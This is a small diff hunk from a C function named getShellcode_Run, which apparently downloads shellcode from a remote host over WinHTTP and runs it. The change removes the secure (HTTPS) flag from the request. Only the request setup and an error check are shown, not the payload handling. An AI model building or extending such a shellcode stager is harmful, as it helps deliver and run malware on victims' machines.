@@ -355,7 +355,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
-    hRequest = WinHttpOpenRequest(hConnect, L"GET", wResource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    hRequest = WinHttpOpenRequest(hConnect, L"GET", wResource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0); // No WINHTTP_FLAG_SECURE
     if (!hRequest) {
         char msg[256];
         sprintf_s(msg, "WinHttpOpenRequest failed with error: %ld\n", GetLastError());
